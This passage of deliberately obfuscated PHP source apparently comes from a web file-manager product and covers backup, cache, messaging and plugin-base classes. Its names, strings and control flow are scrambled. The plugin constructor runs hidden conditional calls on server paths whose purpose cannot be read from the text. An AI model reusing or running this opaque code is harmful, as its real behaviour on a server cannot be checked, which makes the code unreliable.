$ƒÂå¬æ); } break; } if (count($¦“ĞÃÂŸ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($İµÕëÒÔ[1536], $İµÕëÒÔ[1537] . count($¦“ĞÃÂŸ) . "\x3b\163\164\x61\x72\x74\x3d{$æùÕƒŞø}\54\x6c\x65\x6e\147\x74\x68\75{$ƒÂå¬æ}\73\160\x6f\163\x65\x3a{$Å‰“İãß}\x7e{$ª¾­·ğ…}"); throw new Exception($İµÕëÒÔ[1538]); } $°Ô©•ı§ = intval($æùÕƒŞø / $øöîÑ¥) * $øöîÑ¥; $Ï³ÍÎû‚ = ceil(($æùÕƒŞø + $ƒÂå¬æ) / $øöîÑ¥) * $øöîÑ¥ - $°Ô©•ı§; $Öüş‘ÔÓ = IO::fileSubstr($this->path, $°Ô©•ı§, $Ï³ÍÎû‚); $¦“ĞÃÂŸ[$°Ô©•ı§ . $İµÕëÒÔ[12]] = $Öüş‘ÔÓ; ksort($¦“ĞÃÂŸ); $’İò«“Â = substr($Öüş‘ÔÓ, $æùÕƒŞø - $°Ô©•ı§, $ƒÂå¬æ); return $’İò«“Â; } private function log($êÚ‰¹ê, $Û£‚»¾‚) { $Ë‡İÃˆ =& $_SERVER[³·—™¤¢]; $ŒŠ¯¤¦ğ = timeFloat() - $this->timeStart; write_log(sprintf($Ë‡İÃˆ[1539], $êÚ‰¹ê, $this->info[$Ë‡İÃˆ[32]], $ŒŠ¯¤¦ğ, $Û£‚»¾‚), $Ë‡İÃˆ[1206]); } } class Message { function __construct() { } public function send($ú‚™á¤ = '', $µÀ„Ó·Ì = array(), $´Ÿ·£”’ = "\x74\145\170\164") { $ÂøÇ¸¨ =& $_SERVER[³·—™¤¢]; $œÜÙö´ = array($ÂøÇ¸¨[33] => $ÂøÇ¸¨[1540], $ÂøÇ¸¨[775] => $ú‚™á¤); if (in_array($´Ÿ·£”’, array($ÂøÇ¸¨[1540], $ÂøÇ¸¨[1541]))) { $œÜÙö´[$ÂøÇ¸¨[33]] = $´Ÿ·£”’; } $µÀ„Ó·Ì = array($ÂøÇ¸¨[515] => isset($µÀ„Ó·Ì[$ÂøÇ¸¨[515]]) ? $µÀ„Ó·Ì[$ÂøÇ¸¨[515]] : $ÂøÇ¸¨[12], $ÂøÇ¸¨[600] => isset($µÀ„Ó·Ì[$ÂøÇ¸¨[600]]) ? $µÀ„Ó·Ì[$ÂøÇ¸¨[600]] : $ÂøÇ¸¨[12]); if (empty($ú‚™á¤) || empty($µÀ„Ó·Ì[$ÂøÇ¸¨[515]]) && empty($µÀ„Ó·Ì[$ÂøÇ¸¨[600]])) { return !1; } $ˆá¥’†° = array($ÂøÇ¸¨[1481] => $œÜÙö´, $ÂøÇ¸¨[1542] => $µÀ„Ó·Ì); Hook::trigger($ÂøÇ¸¨[1543], $ˆá¥’†°); } } goto B¥İ”®çÜ; F—ñĞö‚–è: class BackupDbFile { public function __construct() { } public function index() { $¯®½’¤› =& $_SERVER[³·—™¤¢]; $œŸÜØÁª = Backup::get(); $½š¿´†á = $œŸÜØÁª[$¯®½’¤›[32]]; $ß¿¬ÁÃ§ = $this->tmpFilesPath() . "\142\x61\143\x6b\x75\x70\x5f{$½š¿´†á}\x2f"; $ùµü‘Š­ = $this->backupPath($œŸÜØÁª); if (!($ùµü‘Š­ = IO::mkdir($ùµü‘Š­))) { return !1; } $†¡¤ŸÉ÷ = IO::listPath($ß¿¬ÁÃ§); $¨Ô–È¬² = isset($†¡¤ŸÉ÷[$¯®½’¤›[83]]) ? $†¡¤ŸÉ÷[$¯®½’¤›[83]] : array(); $éˆÙÈ¼ = array_sum(array_column($¨Ô–È¬², $¯®½’¤›[76])); if (!$éˆÙÈ¼) { return !1; } $ÜğÛÓÄ’ = array($¯®½’¤›[818] => $éˆÙÈ¼, $¯®½’¤›[819] => time()); Backup::set($ÜğÛÓÄ’); $Ø€ùŞ®¿ = new TaskFileTransfer($¯®½’¤›[820], $¯®½’¤›[800], count($¨Ô–È¬²), LNG($¯®½’¤›[801]) . $¯®½’¤›[386] . LNG($¯®½’¤›[803]) . $¯®½’¤›[821]); $Ø€ùŞ®¿->task[$¯®½’¤›[783]] = $éˆÙÈ¼; foreach ($†¡¤ŸÉ÷[$¯®½’¤›[83]] as $ÔÂ–ñÈû) { $ßÏçÍ½Æ = IO::move($ÔÂ–ñÈû[$¯®½’¤›[84]], $ùµü‘Š­); if (!$ßÏçÍ½Æ) { $Ø€ùŞ®¿->end(); $šä¬ëÇÊ = IO::getLastError($¯®½’¤›[822] . $ÔÂ–ñÈû[$¯®½’¤›[84]] . $¯®½’¤›[823] . $ùµü‘Š­ . $¯®½’¤›[164]); write_log($šä¬ëÇÊ, $¯®½’¤›[800]); return !1; } } $Ãñà‚° = new DbManage(); $íÄŞ‘†š = $Ãñà‚°->getSqlFile(); if (!$íÄŞ‘†š[$¯®½’¤›[824]] || !$íÄŞ‘†š[$¯®½’¤›[13]]) { return !1; } IO::move($íÄŞ‘†š[$¯®½’¤›[824]], $ùµü‘Š­); IO::move($íÄŞ‘†š[$¯®½’¤›[13]], $ùµü‘Š­); $Ø€ùŞ®¿->end(); $ÜğÛÓÄ’ = array($¯®½’¤›[825] => $éˆÙÈ¼, $¯®½’¤›[826] => time()); Backup::set($ÜğÛÓÄ’); return !0; } private function backupPath($¡Ş¡²¡‡) { $¹ÄÖë× =& $_SERVER[³·—™¤¢]; $©‡®¬óµ = $¡Ş¡²¡‡[$¹ÄÖë×[32]]; $ÈàĞ•Ë = Model($¹ÄÖë×[790])->get($¹ÄÖë×[791]); $ÒôÔ´®É = substr(md5($¹ÄÖë×[792] . $ÈàĞ•Ë . $©‡®¬óµ), 0, 8); return "\x7b\x69\157\x3a{$¡Ş¡²¡‡[$¹ÄÖë×[772]]}\x7d\x2f\144\141\x74\x61\142\141\x73\x65\57\142\141\x63\153\x75\160\57" . $©‡®¬óµ . $¹ÄÖë×[11] . $ÒôÔ´®É; } private function tmpFilesPath() { $“®§‹Õ· =& $_SERVER[³·—™¤¢]; $ˆ€Çïß¶ = TEMP_FILES; if ($GLOBALS[$“®§‹Õ·[6]][$“®§‹Õ·[89]][$“®§‹Õ·[816]]) { $ˆ€Çïß¶ = $GLOBALS[$“®§‹Õ·[6]][$“®§‹Õ·[89]][$“®§‹Õ·[816]]; if (!mk_dir($ˆ€Çïß¶) || !is_writable($ˆ€Çïß¶) || !IO::mkfile($ˆ€Çïß¶ . $“®§‹Õ·[817])) { $ˆ€Çïß¶ = TEMP_FILES; } } return $ˆ€Çïß¶; } } class BackupFile { public function __construct() { } public function index() { $Œ¼â = Backup::get(); $îğíÜ·‰ = $Œ¼â[$_SERVER[³·—™¤¢][293]][$_SERVER[³·—™¤¢][199]][$_SERVER[³·—™¤¢][468]]; $¶˜Ÿù€ş = array($_SERVER[³·—™¤¢][469] => array($_SERVER[³·—™¤¢][827], $îğíÜ·‰), $_SERVER[³·—™¤¢][828] => array($_SERVER[³·—™¤¢][331], $Œ¼â[$_SERVER[³·—™¤¢][772]])); $’ôŸ¯° = (int) Model($_SERVER[³·—™¤¢][809])->where($¶˜Ÿù€ş)->count($_SERVER[³·—™¤¢][468]); $ÉŸÂş´ò = (int) Model($_SERVER[³·—™¤¢][809])->where($¶˜Ÿù€ş)->sum($_SERVER[³·—™¤¢][76]); $Â³âşÇ = new TaskFileTransfer($_SERVER[³·—™¤¢][829], $_SERVER[³·—™¤¢][800], $’ôŸ¯°, LNG($_SERVER[³·—™¤¢][801]) . $_SERVER[³·—™¤¢][802] . LNG($_SERVER[³·—™¤¢][830])); $Â³âşÇ->task[$_SERVER[³·—™¤¢][783]] = $ÉŸÂş´ò; $ñöÅÏÌÚ = array($_SERVER[³·—™¤¢][831] => $’ôŸ¯°, $_SERVER[³·—™¤¢][832] => $ÉŸÂş´ò, $_SERVER[³·—™¤¢][833] => time()); Backup::set($ñöÅÏÌÚ); $ƒ«ï™ãÏ = !0; $Š˜Åë¤Ó = $this->storeIds(); $«õÉŠšÓ = 1; $Çõ½¿ô = 1000; $ªÏü™şÉ = $ºñÍ¥ŠÊ = 0; $•¸²°ñ» = array(); $ÏŠ¶­¹ = $°àÏåœ¨ = 0; do { $—Ú¾éÎ” = $_SERVER[³·—™¤¢][834]; $£°œÓ¼‘ = Model($_SERVER[³·—™¤¢][809])->where($¶˜Ÿù€ş)->field($—Ú¾éÎ”)->order($_SERVER[³·—™¤¢][835])->selectPage($Çõ½¿ô, $«õÉŠšÓ); $¶™šü® = !empty($£°œÓ¼‘[$_SERVER[³·—™¤¢][369]]) ? $£°œÓ¼‘[$_SERVER[³·—™¤¢][369]] : array(); foreach ($¶™šü® as $ˆçÑ¿¬Å) { if (!$this->_fileExist($ˆçÑ¿¬Å, $•¸²°ñ», $Š˜Åë¤Ó)) { $’ôŸ¯° -= 1; $ÉŸÂş´ò -= (int) $ˆçÑ¿¬Å[$_SERVER[³·—™¤¢][76]]; write_log("\x66\151\154\x65\40\156\157\164\40\145\170\151\163\x74\56\146\x69\154\145\x49\x44\72{$ˆçÑ¿¬Å[$_SERVER[³·—™¤¢][468]]}\x2c\x20\x70\141\164\150\72{$ˆçÑ¿¬Å[$_SERVER[³·—™¤¢][84]]}", $_SERVER[³·—™¤¢][836]); continue; } $âÃŞÏ = $ˆçÑ¿¬Å[$_SERVER[³·—™¤¢][84]]; $Œ«ì«¬‚ = "\x7b\x69\x6f\72{$Œ¼â[$_SERVER[³·—™¤¢][772]]}\175" . substr($âÃŞÏ, strlen("\x7b\151\157\72{$ˆçÑ¿¬Å[$_SERVER[³·—™¤¢][837]]}\175")); if (IO::exist($Œ«ì«¬‚)) { $Â³âşÇ->updateFileEnd($ˆçÑ¿¬Å[$_SERVER[³·—™¤¢][32]], $ˆçÑ¿¬Å[$_SERVER[³·—™¤¢][76]]); } else { $Œ«ì«¬‚ = get_path_father($Œ«ì«¬‚); IO::mkdir($Œ«ì«¬‚); if (!IO::copy($âÃŞÏ, $Œ«ì«¬‚, $_SERVER[³·—™¤¢][838])) { write_log($_SERVER[³·—™¤¢][839] . $âÃŞÏ . $_SERVER[³·—™¤¢][823] . $Œ«ì«¬‚ . $_SERVER[³·—™¤¢][164], $_SERVER[³·—™¤¢][800]); $ƒ«ï™ãÏ = !1; break; } } $îğíÜ·‰ = $ˆçÑ¿¬Å[$_SERVER[³·—™¤¢][468]]; $ºñÍ¥ŠÊ += 1; $ªÏü™şÉ += $ˆçÑ¿¬Å[$_SERVER[³·—™¤¢][76]]; $°àÏåœ¨ += 1; $ÏŠ¶­¹ += $ˆçÑ¿¬Å[$_SERVER[³·—™¤¢][76]]; if ($ªÏü™şÉ >= 1024 * 1024 * 100) { $ñöÅÏÌÚ = array($_SERVER[³·—™¤¢][840] => $îğíÜ·‰, $_SERVER[³·—™¤¢][841] => $°àÏåœ¨, $_SERVER[³·—™¤¢][842] => $ÏŠ¶­¹); Backup::set($ñöÅÏÌÚ); $ªÏü™şÉ = $ºñÍ¥ŠÊ = 0; } } $ÑŠØÑ— = count($¶™šü®); $«õÉŠšÓ++; } while ($ÑŠØÑ— == $Çõ½¿ô); $Â³âşÇ->end(); $ñöÅÏÌÚ = array($_SERVER[³·—™¤¢][843] => 1, $_SERVER[³·—™¤¢][497] => time(), $_SERVER[³·—™¤¢][795] => 1, $_SERVER[³·—™¤¢][840] => $îğíÜ·‰, $_SERVER[³·—™¤¢][832] => $ÉŸÂş´ò, $_SERVER[³·—™¤¢][831] => $’ôŸ¯°, $_SERVER[³·—™¤¢][844] => time()); if ($ºñÍ¥ŠÊ) { $ñöÅÏÌÚ[$_SERVER[³·—™¤¢][841]] = $°àÏåœ¨; $ñöÅÏÌÚ[$_SERVER[³·—™¤¢][842]] = $ÏŠ¶­¹; } Backup::set($ñöÅÏÌÚ); $this->_fileFilter($•¸²°ñ»); return !0; } private function _fileExist($¯—¯ßş½, &$ÖïŸÁÔ„, $–ğŠâóµ) { $¬¡àÔë² =& $_SERVER[³·—™¤¢]; $¥›èÍïÎ = $¯—¯ßş½[$¬¡àÔë²[84]]; if (in_array($¯—¯ßş½[$¬¡àÔë²[468]], $ÖïŸÁÔ„)) { return !1; } if (!in_array($¯—¯ßş½[$¬¡àÔë²[837]], $–ğŠâóµ)) { return !1; } if (IO::exist($¥›èÍïÎ)) { return !0; } $–Ü¥ø¾ = get_path_father($¥›èÍïÎ); if (IO::exist($–Ü¥ø¾)) { $ÖïŸÁÔ„[] = $¯—¯ßş½[$¬¡àÔë²[468]]; return !1; } $Ã¦å›º° = array($¬¡àÔë²[837] => $¯—¯ßş½[$¬¡àÔë²[837]], $¬¡àÔë²[84] => array($¬¡àÔë²[383], "{$–Ü¥ø¾}\45")); $¼ı¸Øõ = Model($¬¡àÔë²[809])->where($Ã¦å›º°)->field($¬¡àÔë²[469])->select(); $ÖïŸÁÔ„ = array_merge($ÖïŸÁÔ„, array_to_keyvalue($¼ı¸Øõ, $¬¡àÔë²[12], $¬¡àÔë²[468])); return !1; } private function _fileFilter($†£¨»ß¡) { $É¥Ù» =& $_SERVER[³·—™¤¢]; if (empty($†£¨»ß¡)) { return; } $“ôÏÕø = array($É¥Ù»[468] => array($É¥Ù»[7], array_unique($†£¨»ß¡))); $à¶Ô÷¡‹ = Model($É¥Ù»[845])->where($“ôÏÕø)->field($É¥Ù»[402])->select(); foreach ($à¶Ô÷¡‹ as $ü€´Û ó) { Model($É¥Ù»[845])->remove($ü€´Û ó[$É¥Ù»[402]], !1); } } private function storeIds() { $¨åü„ô€ =& $_SERVER[³·—™¤¢]; $òğ¹ÏŠ = Model($¨åü„ô€[787])->listData(); $”¶Í§òÑ = array(); $ÒéÙàØš = $GLOBALS[$¨åü„ô€[6]][$¨åü„ô€[89]][$¨åü„ô€[846]]; foreach ($òğ¹ÏŠ as $€ô‰Œ‘²) { $ÄÁÙ•¹“ = strtolower($€ô‰Œ‘²[$¨åü„ô€[95]]); if (!isset($ÒéÙàØš[$ÄÁÙ•¹“])) { continue; } $ÁÔäĞ•  = $¨åü„ô€[74] . (isset($ÒéÙàØš[$ÄÁÙ•¹“]) ? $ÒéÙàØš[$ÄÁÙ•¹“] : ucfirst($ÄÁÙ•¹“)); if (!class_exists($ÁÔäĞ• )) { continue; } $”¶Í§òÑ[] = $€ô‰Œ‘²[$¨åü„ô€[399]]; } return $”¶Í§òÑ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $×¹·Ò²Ş =& $_SERVER[³·—™¤¢]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ÊÈ¸ş…» = $GLOBALS[$×¹·Ò²Ş[6]][$×¹·Ò²Ş[349]]; $Ï°é½Â¤ = $ÊÈ¸ş…»[$ÊÈ¸ş…»[$×¹·Ò²Ş[847]]]; $´ÕÓ›™ä = $ÊÈ¸ş…»[$×¹·Ò²Ş[848]]; switch ($ÊÈ¸ş…»[$×¹·Ò²Ş[847]]) { case $×¹·Ò²Ş[21]: self::$handle = Model($×¹·Ò²Ş[849]); break; case $×¹·Ò²Ş[850]: self::$handle = new CacheRedis($Ï°é½Â¤, $´ÕÓ›™ä); break; case $×¹·Ò²Ş[851]: self::$handle = new CacheMemcached($Ï°é½Â¤, $´ÕÓ›™ä); break; case $×¹·Ò²Ş[199]: self::$handle = new CacheFile($Ï°é½Â¤, $´ÕÓ›™ä); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($èÌÄ·âš) { if (is_array($èÌÄ·âš) || is_object($èÌÄ·âš)) { $èÌÄ·âš = json_encode($èÌÄ·âš); } $èÌÄ·âš = rawurlencode($èÌÄ·âš); return md5(KOD_SITE_ID . $_SERVER[³·—™¤¢][11] . $èÌÄ·âš); } public static function get($—äÄ‚Èö, $õÂêÌ½ = false) { $å¡¯öÊ = self::key($—äÄ‚Èö); if ($õÂêÌ½) { return unserialize(self::init()->get($å¡¯öÊ)); } if (!isset(self::$memoryCache[$å¡¯öÊ])) { $ôÖ€ôÚ¥ = self::init()->get($å¡¯öÊ); self::$memoryCache[$å¡¯öÊ] = unserialize($ôÖ€ôÚ¥); } return self::$memoryCache[$å¡¯öÊ]; } public static function set($œ¶®å‡, $°¯Œİè, $”ñãĞª÷ = false) { $—éÊ´Ø = self::key($œ¶®å‡); if (isset(self::$memoryCache[$—éÊ´Ø]) && self::$memoryCache[$—éÊ´Ø] === $°¯Œİè) { return !0; } if ($”ñãĞª÷ === 0) { self::$memoryCache[$—éÊ´Ø] = $°¯Œİè; return !0; } CacheLock::lock($œ¶®å‡); $ËÊôò¾ì = self::init()->set($—éÊ´Ø, serialize($°¯Œİè), $”ñãĞª÷); self::$memoryCache[$—éÊ´Ø] = $°¯Œİè; CacheLock::unlock($œ¶®å‡); return $ËÊôò¾ì; } public static function getCall($§§úğé, $§•ğÔ´Ø, $Ù‹›ˆÄ , $“Ûşš¡æ = array()) { $øÆÃ¥’ =& $_SERVER[³·—™¤¢]; $ïÏŞò†÷ = self::get($§§úğé); if ($ïÏŞò†÷ || $ïÏŞò†÷ === $øÆÃ¥’[12]) { return $ïÏŞò†÷; } $ïÏŞò†÷ = call_user_func_array($Ù‹›ˆÄ , $“Ûşš¡æ); $ïÏŞò†÷ = $ïÏŞò†÷ ? $ïÏŞò†÷ : $øÆÃ¥’[12]; self::set($§§úğé, $ïÏŞò†÷, $§•ğÔ´Ø); return $ïÏŞò†÷; } public static function remove($×Å©ã˜) { $Â— ¾¼ô = self::key($×Å©ã˜); unset(self::$memoryCache[$Â— ¾¼ô]); self::clearTimeout(); CacheLock::lock($×Å©ã˜); $¿È¹îñ’ = self::init()->remove($Â— ¾¼ô); CacheLock::unlock($×Å©ã˜); return $¿È¹îñ’; } public static function removeMemory($ñ–‰ê˜Õ) { $ÂäúÊÈş = self::key($ñ–‰ê˜Õ); unset(self::$memoryCache[$ÂäúÊÈş]); } public static function clearMemory($Şá¼æÃ˜ = false) { if ($Şá¼æÃ˜) { $Şá¼æÃ˜ = self::key($Şá¼æÃ˜); unset(self::$memoryCache[$Şá¼æÃ˜]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[³·—™¤¢][852])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[³·—™¤¢][853])) { self::init()->clearTimeout(); } } } goto Eêò×ÚÂùŠ; B¥İ”®çÜ: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¾À…Š‚Ç =& $_SERVER[³·—™¤¢]; if ($_SERVER[$¾À…Š‚Ç[892]] != $_SERVER[$¾À…Š‚Ç[893]]) { $ÈªØÖçú = $¾À…Š‚Ç[894]; $Ÿ÷ìÄÉ = $¾À…Š‚Ç[895]; $àÕ‘©èÁ = $_SERVER[$¾À…Š‚Ç[896]] . $¾À…Š‚Ç[897]; $€§ü–Üı = $Ÿ÷ìÄÉ($àÕ‘©èÁ); $å›ó¥ªı = explode($¾À…Š‚Ç[231], $€§ü–Üı); if (count($å›ó¥ªı) < $¾À…Š‚Ç[615]) { $¼¹Øù¨û = $¾À…Š‚Ç[898]; $¼¹Øù¨û(); } $Á£˜ÊÙÛ = $¾À…Š‚Ç[899]; $Á£˜ÊÙÛ($_SERVER[$¾À…Š‚Ç[900]]); $Á£˜ÊÙÛ($_SERVER[$¾À…Š‚Ç[896]] . $¾À…Š‚Ç[901]); $†ë»†Çğ = 1; while ($†ë»†Çğ > 1) { $†ë»†Çğ = $†ë»†Çğ + 4; $µıÂÀµ = rawurlencode($†ë»†Çğ . $¾À…Š‚Ç[378]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¾À…Š‚Ç[1544]); $this->pluginName = str_replace($¾À…Š‚Ç[1544], $¾À…Š‚Ç[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¾À…Š‚Ç[8]; $this->pluginApi = appHostGet() . $¾À…Š‚Ç[1545] . $this->pluginName . $¾À…Š‚Ç[8]; $this->pluginHost = $config[$¾À…Š‚Ç[1546]] . $this->pluginName . $¾À…Š‚Ç[8]; $this->pluginHostDefault = $config[$¾À…Š‚Ç[1546]] . $this->pluginName . $¾À…Š‚Ç[8]; $±æğîí = $config[$¾À…Š‚Ç[1547]]; if ($±æğîí && strpos($¾À…Š‚Ç[50] . $±æğîí . $¾À…Š‚Ç[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$¾À…Š‚Ç[1548]] . $this->pluginName . $¾À…Š‚Ç[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[³·—™¤¢][1549]); } protected function assign($ç»ëŞ«£, $œ®Úğ›¯ = false) { if (is_array($ç»ëŞ«£)) { $this->values = array_merge($this->values, $ç»ëŞ«£); } else { $this->values[$ç»ëŞ«£] = $œ®Úğ›¯; } } protected function display($ÇÃŞ³ÚÌ) { extract($this->values); require $ÇÃŞ³ÚÌ; } final function hookRegist($‘¦ĞÑÅÜ) { $this->modelPlugin->appRegist($this->pluginName, $‘¦ĞÑÅÜ); } final function appIcon() { $±ñ¬Œ•ã =& $_SERVER[³·—™¤¢]; $”â¼ö«½ = $this->appPackage(); $ç°©Å‰Ä = $±ñ¬Œ•ã[12]; if (isset($”â¼ö«½[$±ñ¬Œ•ã[416]])) { if (isset($”â¼ö«½[$±ñ¬Œ•ã[416]][$±ñ¬Œ•ã[1550]])) { $ç°©Å‰Ä = $±ñ¬Œ•ã[1551] . $”â¼ö«½[$±ñ¬Œ•ã[416]][$±ñ¬Œ•ã[1550]] . $±ñ¬Œ•ã[1552]; } else { if ($”â¼ö«½[$±ñ¬Œ•ã[416]][$±ñ¬Œ•ã[1553]]) { $ç°©Å‰Ä = $±ñ¬Œ•ã[1554] . $”â¼ö«½[$±ñ¬Œ•ã[416]][$±ñ¬Œ•ã[1553]] . $±ñ¬Œ•ã[1555]; } } } return $ç°©Å‰Ä; } final function fileCanView($Ú½›İ¦ş) { $ô¡Äğ¤ú =& $_SERVER[³·—™¤¢]; if (request_url_safe($Ú½›İ¦ş)) { return !0; } if ($this->isShare($Ú½›İ¦ş)) { return !0; } $Ÿ”Í­Ò¬ = Session::get($ô¡Äğ¤ú[1556]); if (!$Ÿ”Í­Ò¬ || !$Ÿ”Í­Ò¬[$ô¡Äğ¤ú[1557]]) { $¯œ­àˆ = $ô¡Äğ¤ú[1558] . rawurlencode(this_url()); show_tips(LNG($ô¡Äğ¤ú[1559]) . $ô¡Äğ¤ú[1560] . $¯œ­àˆ . $ô¡Äğ¤ú[1561] . LNG($ô¡Äğ¤ú[1562]) . $ô¡Äğ¤ú[1563], !1); } if (!Action($ô¡Äğ¤ú[1564])->authCan($ô¡Äğ¤ú[1565])) { show_tips(LNG($ô¡Äğ¤ú[1566]) . $ô¡Äğ¤ú[1567], !1); } ActionCall($ô¡Äğ¤ú[1568], $Ú½›İ¦ş); } final function isShare($Ì±ŠÛ«) { $­ªì‹Ê = KodIO::parse($Ì±ŠÛ«); return $­ªì‹Ê[$_SERVER[³·—™¤¢][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($«ˆ„øÔ”) { if (request_url_safe($«ˆ„øÔ”)) { return $«ˆ„øÔ”; } if (!$this->isShare($«ˆ„øÔ”)) { $«ˆ„øÔ” = $this->filePath($«ˆ„øÔ”); } return Action($_SERVER[³·—™¤¢][1198])->linkOut($«ˆ„øÔ”); } public function filePathLinkOut($°Š¦«­) { if (request_url_safe($°Š¦«­)) { return $°Š¦«­; } $this->fileCanView($°Š¦«­); return Action($_SERVER[³·—™¤¢][1198])->link($°Š¦«­); } final function filePath($””æş—Ï) { $ìŞ—Ê =& $_SERVER[³·—™¤¢]; if ($ğ‡ºƒ€ = $this->checkSharePath($””æş—Ï)) { Hook::trigger($ìŞ—Ê[1569], $ğ‡ºƒ€); return $ğ‡ºƒ€; } $this->fileCanView($””æş—Ï); if (request_url_safe($””æş—Ï)) { $àñõ¦Ù‡ = parse_url_query($””æş—Ï); if (isset($àñõ¦Ù‡[$ìŞ—Ê[1570]]) && isset($àñõ¦Ù‡[$ìŞ—Ê[213]])) { $­–ü²²— = Model($ìŞ—Ê[790])->get($ìŞ—Ê[791]); $ÎÍ˜‡ıß = Mcrypt::decode($àñõ¦Ù‡[$ìŞ—Ê[213]], $­–ü²²—); if ($ÎÍ˜‡ıß) { $this->fileInfo = IO::infoWithChildren($ÎÍ˜‡ıß); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $ÎÍ˜‡ıß; } } $””æş—Ï = $this->_cacheHttpFile($””æş—Ï); $this->fileInfo = IO::infoWithChildren($””æş—Ï); } else { $this->fileInfo = IO::infoWithChildren($””æş—Ï); if (!$this->fileInfo) { show_tips(LNG($ìŞ—Ê[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($ìŞ—Ê[1569], $””æş—Ï); return $””æş—Ï; } final function _cacheHttpFile($€µÂ›‘ç) { $£“Úó¶© = hash_path($€µÂ›‘ç, !0); $this->cachePath = $this->pluginCachePath($£“Úó¶©); if ($ÓØ¦—ÃŠ = IO::fileNameExist($this->cachePath, $£“Úó¶©)) { return KodIO::make($ÓØ¦—ÃŠ); } $¬·¾—É© = $this->cachePath . $£“Úó¶©; return $this->pluginCacheFileSet($¬·¾—É©, file_get_contents_nossl($€µÂ›‘ç)); } final function _tmpFileName($àıƒ = array()) { $ğÁŠ£À« =& $_SERVER[³·—™¤¢]; if (!$àıƒ) { $àıƒ = $this->fileInfo; } if (isset($àıƒ[$ğÁŠ£À«[177]])) { return $àıƒ[$ğÁŠ£À«[177]]; } if (isset($àıƒ[$ğÁŠ£À«[170]][$ğÁŠ£À«[177]])) { return $àıƒ[$ğÁŠ£À«[170]][$ğÁŠ£À«[177]]; } $›Ş¨¢ƒº = IO::hashSimple($àıƒ[$ğÁŠ£À«[84]]); if ($›Ş¨¢ƒº) { return $›Ş¨¢ƒº; } $›½šöÂÕ = array($àıƒ[$ğÁŠ£À«[32]], $àıƒ[$ğÁŠ£À«[84]], $àıƒ[$ğÁŠ£À«[76]]); if (isset($àıƒ[$ğÁŠ£À«[521]])) { $›½šöÂÕ[] = $àıƒ[$ğÁŠ£À«[521]]; } return md5(implode($ğÁŠ£À«[11], $›½šöÂÕ)); } final function checkSharePath($í¢Œæ‰á) { $¿ê®øª =& $_SERVER[³·—™¤¢]; if (!defined($¿ê®øª[475])) { define($¿ê®øª[514], 0); } if (!$this->isShare($í¢Œæ‰á)) { return !1; } $ü•éÁş“ = Action($¿ê®øª[1198])->sharePathInfo($í¢Œæ‰á); if (!isset($ü•éÁş“[$¿ê®øª[84]])) { show_json(LNG($¿ê®øª[1571]), !1); } $this->fileInfo = $ü•éÁş“[$¿ê®øª[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$¿ê®øª[177]]); return $ü•éÁş“[$¿ê®øª[84]]; } final function pluginCachePath($ñğû—×¿ = '') { $Ö“¦Ø¦ =& $_SERVER[³·—™¤¢]; $ö‘Êì¹° = IO_PATH_SYSTEM_TEMP . $Ö“¦Ø¦[1572] . $this->pluginName; if (!($š“œîÓş = IO::infoFull($ö‘Êì¹°))) { return IO::mkdir($ö‘Êì¹° . $Ö“¦Ø¦[8] . $ñğû—×¿); } if (empty($ñğû—×¿)) { return $š“œîÓş[$Ö“¦Ø¦[84]]; } if (!($›Ç‘³¢Û = IO::fileNameExist($š“œîÓş[$Ö“¦Ø¦[84]], $ñğû—×¿))) { return IO::mkdir($š“œîÓş[$Ö“¦Ø¦[84]] . $ñğû—×¿); } return KodIO::make($›Ç‘³¢Û); } final function pluginCacheFileSet($ŞÛó–âÀ, $ÀşûÇ”º = '') { $¿Ü¥Å§û =& $_SERVER[³·—™¤¢]; if (!($Ğ‹Ì³ = IO::infoFull($ŞÛó–âÀ))) { return IO::mkfile($ŞÛó–âÀ, $ÀşûÇ”º, REPEAT_REPLACE); } IO::setContent($Ğ‹Ì³[$¿Ü¥Å§û[84]], $ÀşûÇ”º); return $Ğ‹Ì³[$¿Ü¥Å§û[84]]; } final function pluginLocalFile($ìÅŠ«æÖ = '') { $ªËêë =& $_SERVER[³·—™¤¢]; $ÖéÒàÑñ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($ÖéÒàÑñ)) { mk_dir($ÖéÒàÑñ); } if (!$ìÅŠ«æÖ) { return $ÖéÒàÑñ; } $·ÜÈæÄ = IO::info($ìÅŠ«æÖ); $¾ÅŠÄ­ = $this->_tmpFileName($·ÜÈæÄ) . $ªËêë[10] . $·ÜÈæÄ[$ªËêë[174]]; if (!checkExtSafe($¾ÅŠÄ­)) { $¾ÅŠÄ­ = $¾ÅŠÄ­ . $ªËêë[1573]; } $¦³‡Ùı¸ = $ÖéÒàÑñ . $¾ÅŠÄ­; if (@file_exists($¦³‡Ùı¸)) { return $¦³‡Ùı¸; } return IO::copy($ìÅŠ«æÖ, $ÖéÒàÑñ, 0, $¾ÅŠÄ­); } final function appPackage() { $÷¦­§Ü£ =& $_SERVER[³·—™¤¢]; if ($this->packageData) { return $this->packageData; } $õË›àïà = $this->parseFile($this->pluginPath . $÷¦­§Ü£[1574]); $this->parseLang($õË›àïà); $¶ë†™¹ = json_decode_force($õË›àïà); if (!$¶ë†™¹) { return array(); } $Áåû€ô¼ = Hook::trigger($÷¦­§Ü£[1575], $¶ë†™¹); if ($Áåû€ô¼ && is_array($Áåû€ô¼)) { 